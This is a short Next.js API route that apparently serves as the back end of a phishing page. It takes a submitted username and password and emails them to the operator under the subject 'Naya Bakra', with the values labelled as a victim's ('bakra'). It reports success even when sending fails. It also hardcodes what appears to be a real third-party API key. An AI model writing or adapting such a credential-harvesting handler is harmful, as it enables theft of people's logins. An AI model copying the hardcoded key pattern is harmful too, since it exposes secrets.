// pages/api/sendEmail.js

import { mailOptions, transporter } from '@/config/nodemailer';
import { NextResponse } from 'next/server';

import { Resend } from 'resend';


const Api_key = "re_cd81XRLd_HYExfAw5yJ98VGmqLdN3BfpY"
const resend = new Resend(Api_key);

export async function POST(request) {

    const { username, password } = await request.json();

    try {
        await transporter.sendMail({
            ...mailOptions,
            subject: "Naya Bakra",
            text: "This is text string",
            html: `<h1>Test Title</h1><p>Bakra username: ${username}</p><p>Bakra password: ${password}</p>`
        })
        return NextResponse.json({ success: true });
    }
    catch (error) {
        return NextResponse.json({ success: true });
    }
}